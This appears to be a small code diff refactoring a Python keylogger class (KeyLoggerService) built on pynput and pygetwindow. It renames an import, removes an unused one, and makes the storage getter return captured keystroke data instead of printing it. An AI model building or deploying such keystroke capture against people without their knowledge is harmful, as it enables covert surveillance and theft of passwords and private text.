@@ -1,8 +1,7 @@
 from pynput import keyboard
-from IKeyLoggerService import IKeloggerService
+from i_key_logger_service import IKeloggerService
 import pygetwindow as gw
 import threading
-import time
 
 class KeyLoggerService(IKeloggerService):
 
@@ -34,5 +33,6 @@ class KeyLoggerService(IKeloggerService):
 
     @property
     def get(self):
-        print(KeyLoggerService.storage)
+        data = KeyLoggerService.storage
         KeyLoggerService.storage = {}
+        return data
